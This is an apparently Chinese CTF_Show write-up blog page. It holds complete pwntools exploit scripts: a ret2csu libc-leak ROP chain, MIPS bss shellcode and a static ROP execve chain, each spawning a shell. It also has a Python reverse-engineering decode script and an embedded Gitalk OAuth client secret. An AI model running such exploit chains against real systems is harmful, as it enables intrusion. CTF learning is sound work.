@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    CTF_Show 部分wp |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-CTF_Show 部分wp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CTF_Show 部分wp
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/29/CTF_Show%20%E9%83%A8%E5%88%86wp/" class="article-date">
+  <time datetime="2020-03-28T16:00:00.000Z" itemprop="datePublished">2020-03-29</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><a id="more"></a>
+
+<p>简单的csu</p>
+<p>注意远程libc是2.27的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"><span class="comment">#context.arch = 'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'124.156.121.112'</span></span><br><span class="line">port = <span class="string">'28007'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">	p = process(file_name)</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,int(port))</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	<span class="comment">#libc = ELF("../libc/18-libc64.so")</span></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">offset = <span class="number">0xa0</span></span><br><span class="line">main_addr = <span class="number">0x4005fd</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">libc_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00000000004006c3</span></span><br><span class="line">csu_front_addr = <span class="number">0x00000000004006A0</span></span><br><span class="line">csu_end_addr = <span class="number">0x00000000004006BA</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">ret = <span class="number">0x00000000004004a9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span> <span class="comment">#这里的r13 r14 r15 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0xa0</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span>   <span class="comment">#此时的r12应为被调用函数的got表地址</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'now,Try Pwn Me?\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">'write_addr '</span> + hex(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'now,Try Pwn Me?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xa0</span> + p64(<span class="number">0</span>)  + p64(pop_rdi) + p64(bin_add)+p64(ret) + p64(sys_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>mips环境的题目，我佛了，代码解释很麻烦，总而言之就是向bss段写入shellcode直接ret</p>
+<p>具体看ctfshow的wp</p>
+<p>surager大佬牛逼   </p>
+<p> <a href="https://wp.ctf.show/d/89-ctfshow-pwn02-babystack" target="_blank" rel="noopener">https://wp.ctf.show/d/89-ctfshow-pwn02-babystack</a></p>
+<p>上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./main"</span>)</span><br><span class="line">context(arch = <span class="string">'mips'</span>,endian = <span class="string">'little'</span>)</span><br><span class="line">bss = <span class="number">0x00410c20</span>+<span class="number">0x10</span></span><br><span class="line">shellcode = <span class="string">"A"</span>*<span class="number">0x10</span> + asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x30</span> + p32(bss) + p32(bss)</span><br><span class="line">r.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">"message:"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>静态链接的题目</p>
+<p>64位程序</p>
+<p>锻炼一下自己构造rop的手法</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./flower'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'124.156.121.112'</span></span><br><span class="line">port = <span class="string">'28015'</span></span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"><span class="comment">#context.arch = 'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">syscall = <span class="number">0x000000000043FA3E</span><span class="comment">#注意，这里的syscall需要后面有ret</span></span><br><span class="line">rax_dx_bx = <span class="number">0x0000000000480956</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi = <span class="number">0x00000000004017b7</span></span><br><span class="line">bss = <span class="number">0x00000000006CBB60</span></span><br><span class="line">read_add = <span class="number">0x00000000041324B</span></span><br><span class="line"><span class="comment">#rax rdi rsi rdx</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span></span><br><span class="line">payload += p64(rax_dx_bx) + p64(<span class="number">0</span>) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(bss)</span><br><span class="line"><span class="comment">#法1：payload += p64(syscall) </span></span><br><span class="line"><span class="comment">#法2：payload += p64(read_add)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(rax_dx_bx) + p64(<span class="number">0x3b</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +p64(syscall)</span><br><span class="line">payload2 = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">p.recvuntil(<span class="string">'Plz Input Your weight(kg):\n&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'4294967290'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Good! what\'s your name??\n&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="reverse-3-来一个派森"><a href="#reverse-3-来一个派森" class="headerlink" title="reverse_3 来一个派森"></a>reverse_3 来一个派森</h3><p>auther：summerN</p>
+<p>BLOG:<a href="http://www.summern.club" target="_blank" rel="noopener">www.summern.club</a></p>
+<p>题目给的是一个exe文件，通过提示，猜测为python打包形成的exe文件</p>
+<p>那么。我们需要将其进行反编译</p>
+<p>工具：1.archive_viewer.py</p>
+<p>​           2.uncompyle6 </p>
+<p>步骤:</p>
+<p>1.使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py checkme.exe</span><br></pre></td></tr></table></figure>
+
+<p>得到一个含有checkme文件的文件夹，</p>
+<p><img src="https://ftp.bmp.ovh/imgs/2020/03/2d4b960e0acd744b.png" alt=""></p>
+<p>我们将checkme 与strust文件用010edit打开，对比，发现pyc文件缺少前12个字节，补充上另存为checkme.pyc</p>
+<p>2.使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 checkme.pyc &gt; checkme.py</span><br></pre></td></tr></table></figure>
+
+<p>我们就获得了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.5.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedded file name: checkme.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58encode</span><span class="params">(tmp)</span>:</span></span><br><span class="line">    tmp = list(map(ord, tmp))</span><br><span class="line">    temp = tmp[<span class="number">0</span>]</span><br><span class="line">    base58 = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp) - <span class="number">1</span>):</span><br><span class="line">        temp = temp * <span class="number">256</span> + tmp[(i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        tmp.insert(<span class="number">0</span>, temp % <span class="number">58</span>)</span><br><span class="line">        temp = temp // <span class="number">58</span> <span class="comment"># //表示整数除法</span></span><br><span class="line">        <span class="keyword">if</span> temp == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    temp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        temp += base58[i]</span><br><span class="line">    </span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(temp)):</span><br><span class="line">        tmp.append(chr(ord(temp[i]) ^ i))</span><br><span class="line">    </span><br><span class="line">    check = [</span><br><span class="line">     <span class="string">'A'</span>, <span class="string">'5'</span>, <span class="string">'q'</span>, <span class="string">'O'</span>, <span class="string">'g'</span>, <span class="string">'q'</span>, <span class="string">'d'</span>, <span class="string">'\x7f'</span>, <span class="string">'['</span>, <span class="string">'\x7f'</span>, <span class="string">'s'</span>, <span class="string">'&#123;'</span>, <span class="string">'G'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'`'</span>, <span class="string">'D'</span>, <span class="string">'@'</span>, <span class="string">'K'</span>, <span class="string">'c'</span>, <span class="string">'-'</span>, <span class="string">'c'</span>, <span class="string">' '</span>, <span class="string">'G'</span>, <span class="string">'+'</span>, <span class="string">'+'</span>, <span class="string">'|'</span>, <span class="string">'x'</span>, <span class="string">'&#125;'</span>, <span class="string">'J'</span>, <span class="string">'h'</span>, <span class="string">'\\'</span>, <span class="string">'l'</span>]</span><br><span class="line">    <span class="keyword">if</span> tmp == check:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = input(<span class="string">u'flag:'</span>)</span><br><span class="line"><span class="keyword">if</span> b58encode(flag):</span><br><span class="line">    print(<span class="string">'you win'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'try again'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling checkme.pyc</span></span><br></pre></td></tr></table></figure>
+
+<p>3.</p>
+<p>通过encode函数写出解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> check:</span><br><span class="line">	list1.append(ord(i))</span><br><span class="line"><span class="keyword">print</span> list1</span><br><span class="line"><span class="keyword">print</span> len(list1)</span><br><span class="line">list2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list1)):</span><br><span class="line">	list2.append(chr(list1[i] ^ i))</span><br><span class="line"><span class="keyword">print</span> list2</span><br><span class="line">index1 = []</span><br><span class="line">base58 = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:</span><br><span class="line">	index1.append(base58.index(i))<span class="comment">#index查找位置</span></span><br><span class="line"><span class="keyword">print</span> index1</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">tmp = 'ctf'</span></span><br><span class="line"><span class="string">tmp = list(map(ord, tmp))</span></span><br><span class="line"><span class="string">temp = tmp[0]</span></span><br><span class="line"><span class="string">print temp</span></span><br><span class="line"><span class="string">for i in range(len(tmp) - 1):</span></span><br><span class="line"><span class="string">	temp = temp * 256 + tmp[(i + 1)]</span></span><br><span class="line"><span class="string">print temp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">str3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index1:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+]'</span> + <span class="string">'('</span>+str(str3) +<span class="string">' * 58)'</span> + <span class="string">'+'</span> + str(i)</span><br><span class="line">	num1 = (str3 * <span class="number">58</span>) + i</span><br><span class="line">	str3 = num1</span><br><span class="line">	<span class="keyword">print</span> num1</span><br><span class="line">temp = num1</span><br><span class="line">tmp = []</span><br><span class="line"><span class="comment">#下面这一步就是取余还原，倒序加入数组 方法同加密脚本，改一下数就可</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	tmp.insert(<span class="number">0</span>, temp % <span class="number">256</span>)</span><br><span class="line">	temp = temp // <span class="number">256</span> <span class="comment"># //表示整数除法</span></span><br><span class="line">	<span class="keyword">if</span> temp == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">	flag.append(chr(i))</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(flag)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	temp = temp % 256</span></span><br><span class="line"><span class="string">	temp = temp //256</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="密码-ctfshow"><a href="#密码-ctfshow" class="headerlink" title="密码 ctfshow"></a>密码 ctfshow</h3><p>没想到摩斯密码也有中文的hhhhh佛了</p>
+<p><a href="http://moersima.00cha.net/cn.asp" target="_blank" rel="noopener">http://moersima.00cha.net/cn.asp</a></p>
+<p>qq:497710073 一起来学习啊</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://summern.club/2020/03/29/CTF_Show%20%E9%83%A8%E5%88%86wp/" data-id="ck8d4tgx700002glu59jx9ayr"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/03/28/unlink%20exp/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">unlink exp</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
